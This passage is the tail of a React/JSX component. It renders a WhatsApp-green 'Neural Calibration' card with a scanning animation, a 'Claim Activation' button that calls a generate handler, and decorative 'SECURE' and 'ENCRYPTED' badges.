                       <div className="bg-zinc-50 p-8 rounded-[2.5rem] border border-zinc-100 flex flex-col items-center justify-center text-center space-y-6 relative overflow-hidden shadow-inner h-48">
                          <div className="relative w-32 h-32">
                             <div className="absolute inset-0 rounded-full border-2 border-dashed border-[#25D366]/10 animate-[spin_15s_linear_infinite]" />
                             <div className="absolute inset-0 flex items-center justify-center">
                               <div className="w-12 h-12 rounded-full bg-white flex items-center justify-center shadow-md border border-zinc-100">
                                   <UserCheck className="w-6 h-6 text-[#128C7E]" />
                               </div>
                             </div>
                             <div className="absolute top-0 left-0 w-full h-[2px] bg-[#25D366] shadow-[0_0_15px_rgba(37,211,102,1)] animate-scan-y-wa z-10" />
                          </div>
                          <div className="space-y-1">
                            <h4 className="text-[10px] font-black text-zinc-800 uppercase tracking-widest">Neural Calibration</h4>
                            <p className="text-[8px] text-zinc-400 leading-relaxed font-bold uppercase tracking-widest opacity-60 px-4">Facing Node PK-SOUTH-1</p>
                          </div>
                       </div>
                    </div>

                    <div className="space-y-5">
                      <button 
                        onClick={() => handleGenerate()}
                        className="w-full py-6 bg-[#25D366] text-white font-black rounded-2xl transition-all active:scale-[0.98] shadow-xl flex items-center justify-center gap-3 group uppercase tracking-widest relative overflow-hidden"
                      >
                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
                        <CheckCircle2 size={20} />
                        <span className="text-xs">Claim Activation</span>
                      </button>
                      <div className="flex items-center justify-center gap-6 opacity-30 grayscale text-[8px] font-black uppercase tracking-widest">
                         <div className="flex items-center gap-1">
                           <Shield size={10} />
                           <span>SECURE</span>
                         </div>
                         <div className="flex items-center gap-1">
                           <Lock size={10} />
                           <span>ENCRYPTED</span>
                         </div>
                      </div>
                    </div>
                 </div>
               </div>
            </div>
          )}
        </div>
      </main>

      <style jsx>{`
        @keyframes scan-y-wa {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(160px); }
        }
        .animate-scan-y-wa {
          animation: scan-y-wa 5s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}
